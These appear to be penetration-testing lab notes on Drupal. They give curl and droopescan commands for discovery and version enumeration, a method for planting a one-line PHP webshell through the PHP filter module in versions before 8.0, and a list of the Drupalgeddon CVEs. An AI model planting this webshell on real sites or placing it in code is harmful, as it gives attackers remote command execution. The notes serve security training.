# drupal

## Overview

## Discovery

```shell
curl -s http://drupal.inlanefreight.local | grep Drupal
```

## Enumeration

Get versions

```shell
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Use droopscan

```shell
droopescan scan drupal -u http://drupal.inlanefreight.local
```

### Webshell

In versions older than 8.0, it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated." This allows to add a Basic page with a webshell like:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

## Famous Vulnerabilities

	CVE-2014-3704 Drupalgeddon Drupal 7.x versions prior to 7.32 are vulnerable
	CVE-2018-7600 Drupalgeddon2 Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 
	CVE-2018-7602 Drupalgeddon3 Drupal 7.x before 7.59 Drupal 8.x before 8.5.3